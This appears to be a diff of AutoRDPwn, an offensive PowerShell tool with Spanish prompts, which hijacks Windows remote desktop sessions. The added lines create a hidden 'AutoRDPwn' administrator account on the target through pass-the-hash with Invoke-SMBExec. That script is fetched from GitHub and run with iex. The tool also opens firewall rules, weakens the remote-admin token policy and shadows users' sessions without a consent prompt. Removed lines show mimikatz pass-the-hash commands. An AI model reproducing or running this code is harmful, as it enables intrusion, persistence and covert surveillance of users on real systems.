@@ -60,6 +60,7 @@ $Ps1="Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Priv
 $Ps2="netsh advfirewall firewall set rule group='Administración Remota de servicios' new enable=yes ; netsh advfirewall firewall set rule group='Asistencia Remota' new enable=Yes"
 $Ps3="netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes ; netsh advfirewall firewall set rule group='Administración Remota de tareas programadas' new enable=yes"
 $Ps4="netsh advfirewall firewall set rule group='Instrumental de Administración de Windows (WMI)' new enable=yes ; netsh advfirewall firewall set rule group='Administración remota de Windows' new enable=yes"
+$Ps5="net user AutoRDPwn AutoRDPwn /add ; net localgroup Administradores AutoRDPwn /add"
 
     do { 
     Show-Banner ; Show-Menu
@@ -91,17 +92,16 @@ $Ps4="netsh advfirewall firewall set rule group='Instrumental de Administración
 	Write-Host ""
         $domain = Read-Host -Prompt 'Introduce el dominio'
         Write-Host ""
-        $ntlmpass = Read-Host -Prompt 'Por último, el hash NTLM'
-	$PassTheHash = "true"
+        $hash = Read-Host -Prompt 'Por último, el hash NTLM'
         Write-Host ""
-        Write-Output "computer=$computer" > file.txt
         $Host.UI.RawUI.ForegroundColor = 'Blue'
         Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-SMBExec.ps1" -UseBasicParsing | iex
-        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $ntlmpass -Command "powershell.exe $Ps1" -verbose
-        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $ntlmpass -Command "powershell.exe $Ps2" -verbose
-        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $ntlmpass -Command "powershell.exe $Ps3" -verbose
-        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $ntlmpass -Command "powershell.exe $Ps4" -verbose }
-        
+        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Ps1" -verbose
+        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Ps2" -verbose
+        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Ps3" -verbose
+        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Ps4" -verbose
+        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Ps5" -verbose }        
+
 	'3' {
         Write-Host ""
         $computer = Read-Host -Prompt 'Cuál es la IP del servidor?'
@@ -177,15 +177,10 @@ $Ps4="netsh advfirewall firewall set rule group='Instrumental de Administración
         
       } until ($input -in '1','2','3','4','5')
 
-   $Host.UI.RawUI.ForegroundColor = 'Gray'
-   if(Test-Path variable:PassTheHash) { $computer = powershell "(Get-Content file.txt | Out-String | ConvertFrom-StringData | Format-List | findstr 'Value' | select -First 1).split(':')[1].trim()"
-   $PTH = "`$RDP = New-PSSession -Computer $computer"
-   $cmd = "privilege::debug token::elevate 'sekurlsa::pth` /user:$user` /domain:$domain` /ntlm:$ntlmpass` /run:powershell` $PTH' exit"
-   powershell $mimipath\mimikatz.exe $cmd ; Write-Host "" ; del file.txt }
-   
-   else { Write-Host ""
+   $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ""
+   if ($hash) { $PlainTextPassword = ConvertFrom-SecureToPlain $password ; $user="AutoRDPwn" ; $password="AutoRDPwn" }
    $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
-   $RDP = New-PSSession -Computer $computer -credential $credential }      
+   $RDP = New-PSSession -Computer $computer -credential $credential      
    $Host.UI.RawUI.ForegroundColor = 'Yellow'
    Set-NetConnectionProfile -InterfaceAlias "Ethernet*" -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias "Wi-Fi*" -NetworkCategory Private
    Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LocalAccountTokenFilterPolicy -Value 1 -Type DWord
@@ -251,17 +246,8 @@ $Ps4="netsh advfirewall firewall set rule group='Instrumental de Administración
         query session }  
         Write-Host ""
         $shadow = Read-Host -Prompt 'A qué sesión quieres conectarte?' 
-        if(Test-Path variable:PassTheHash) { $admin = "/restrictedadmin" } else { $admin = "/admin" ; $domain = "$null" ; $ntlmpass = "$null" }
-    
-        if($control -eq 'true') { $mimipwn = "mstsc` /v` $computer` $admin` /shadow:$shadow` /control` /noconsentprompt` /f"
-        $passthemimi = "privilege::debug token::elevate 'sekurlsa::pth` /user:$user` /domain:$domain` /ntlm:$ntlmpass` /run:$mimipwn' exit"
-        if(Test-Path variable:PassTheHash) { powershell $mimipath\mimikatz.exe $passthemimi ; del .\mimikatz.zip ; cmd /c "rd /s /q mimikatz" }
-        else { mstsc /v $computer $admin /shadow:$shadow /control /noconsentprompt /prompt /f }}
-    
-        else { $mimipwn = "mstsc` /v` $computer` $admin` /shadow:$shadow` /noconsentprompt` /f"
-        $passthemimi = "privilege::debug token::elevate 'sekurlsa::pth` /user:$user` /domain:$domain` /ntlm:$ntlmpass` /run:$mimipwn' exit"
-        if(Test-Path variable:PassTheHash) { powershell $mimipath\mimikatz.exe $passthemimi ; del .\mimikatz.zip ; cmd /c "rd /s /q mimikatz" }
-        else { mstsc /v $computer $admin /shadow:$shadow /noconsentprompt /prompt /f }}}
+        if($control -eq 'true') { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }
+        else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}
 
     else { Write-Host ""
         Write-Host "$version detectado, aplicando parche.."
@@ -289,17 +275,8 @@ $Ps4="netsh advfirewall firewall set rule group='Instrumental de Administración
     Write-Host ""
     $shadow = invoke-command -session $RDP[0] -scriptblock {(Get-Process explorer | Select-Object SessionId | Format-List | findstr "Id" | select -First 1).split(':')[1].trim()}
     Write-Host "Buscando sesiones activas en el equipo.." -ForegroundColor Yellow ; sleep -milliseconds 2000 
-    if(Test-Path variable:PassTheHash) { $admin = "/restrictedadmin" } else { $admin = "/admin" ; $domain = "$null" ; $ntlmpass = "$null" }
-    
-    if($control -eq 'true') { $mimipwn = "mstsc` /v` $computer` $admin` /shadow:$shadow` /control` /noconsentprompt` /f"
-    $passthemimi = "privilege::debug token::elevate 'sekurlsa::pth` /user:$user` /domain:$domain` /ntlm:$ntlmpass` /run:$mimipwn' exit"
-    if(Test-Path variable:PassTheHash) { powershell $mimipath\mimikatz.exe $passthemimi ; del .\mimikatz.zip ; cmd /c "rd /s /q mimikatz" }
-    else { mstsc /v $computer $admin /shadow:$shadow /control /noconsentprompt /prompt /f }}
-    
-    else { $mimipwn = "mstsc` /v` $computer` $admin` /shadow:$shadow` /noconsentprompt` /f"
-    $passthemimi = "privilege::debug token::elevate 'sekurlsa::pth` /user:$user` /domain:$domain` /ntlm:$ntlmpass` /run:$mimipwn' exit"
-    if(Test-Path variable:PassTheHash) { powershell $mimipath\mimikatz.exe $passthemimi ; del .\mimikatz.zip ; cmd /c "rd /s /q mimikatz" }
-    else { mstsc /v $computer $admin /shadow:$shadow /noconsentprompt /prompt /f }}}
+    if($control -eq 'true') { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }
+    else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}
 
 Write-Host ""
 $session = get-pssession
